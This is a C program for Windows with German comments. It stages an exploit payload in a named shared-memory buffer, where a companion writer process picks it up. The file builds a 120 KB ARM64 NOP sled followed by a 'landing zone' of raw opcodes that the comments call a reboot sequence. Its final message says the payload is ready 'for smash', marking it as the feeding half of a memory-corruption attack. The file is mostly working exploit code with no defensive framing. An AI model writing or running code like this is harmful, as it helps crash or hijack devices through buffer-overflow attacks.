#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

// WICHTIG: Beides auf 32/33 synchronisiert
#define BLOCK_SIZE 32
#define SHM_SIZE 33
#define SHM_NAME "Local\\MyCustomProtocol"
#define MUTEX_NAME "Local\\MyProtocolMutex"
#define TARGET_SIZE_KB 120 
#define MAX_TICKS ((TARGET_SIZE_KB * 1024) / BLOCK_SIZE)

int main(int argc, char *argv[]) {
    // 1. Initialisierung (Die fehlenden Variablen)
    HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, SHM_SIZE, SHM_NAME);
    if (!hMap) { printf("Fehler: SHM konnte nicht erstellt werden.\n"); return 1; }
    
    unsigned char* shm_buffer = (unsigned char*) MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, SHM_SIZE);
    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
    
    if (!shm_buffer || !hMutex) { printf("Fehler: Buffer oder Mutex fehlgeschlagen.\n"); return 1; }

    unsigned int tick = 0;
    unsigned char local_packet[BLOCK_SIZE];
    
    // Opcodes
    unsigned int nop_opcode = 0xd503201f; // ARM64 NOP
    unsigned int reboot_cmd[] = { 0xd280ed00, 0xf2a70000, 0x52800101, 0xb9000001 };

    printf("[ SYSTEM ] Starte NOP-Teppich (120 KB, 32-Byte Blöcke)...\n");

    shm_buffer[0] = 0x00; // Reset Status

    while (tick < MAX_TICKS) {
        WaitForSingleObject(hMutex, INFINITE);
        
        // Warten, falls der Writer (di.c) noch nicht gelesen hat
        if (shm_buffer[0] == 0x2A) { 
            ReleaseMutex(hMutex); 
            Sleep(0); // CPU entlasten
            continue; 
        }

        memset(local_packet, 0, BLOCK_SIZE);

        // Die Strategie:
        if (tick > MAX_TICKS - 200) {
            // Die letzten 200 Pakete sind die "Landing Zone" mit Reboots
            // Wir füllen den 32-Byte Block 2x mit der 16-Byte Reboot-Sequenz
            memcpy(&local_packet[0], reboot_cmd, 16);
            memcpy(&local_packet[16], reboot_cmd, 16);
        } else {
            // Der Rest ist ein reiner NOP-Sled (8x 4-Byte NOP)
            unsigned int* p = (unsigned int*)local_packet;
            for(int i = 0; i < 8; i++) {
                p[i] = nop_opcode;
            }
        }

        // Kopieren in den SHM (Offset +1 wegen Protokoll-Byte)
        memcpy(shm_buffer + 1, local_packet, BLOCK_SIZE);
        shm_buffer[0] = 0x2A; // Signal: Daten bereit
        
        ReleaseMutex(hMutex);
        tick++;

        if (tick % 500 == 0) printf("Fortschritt: %u / %u Ticks\n", tick, MAX_TICKS);
    }

    // Finale
    WaitForSingleObject(hMutex, INFINITE);
    shm_buffer[0] = 0xFF;
    ReleaseMutex(hMutex);
    
    printf("[ DONE ] Payload im SHM bereit für Smash.\n");
    return 0;
}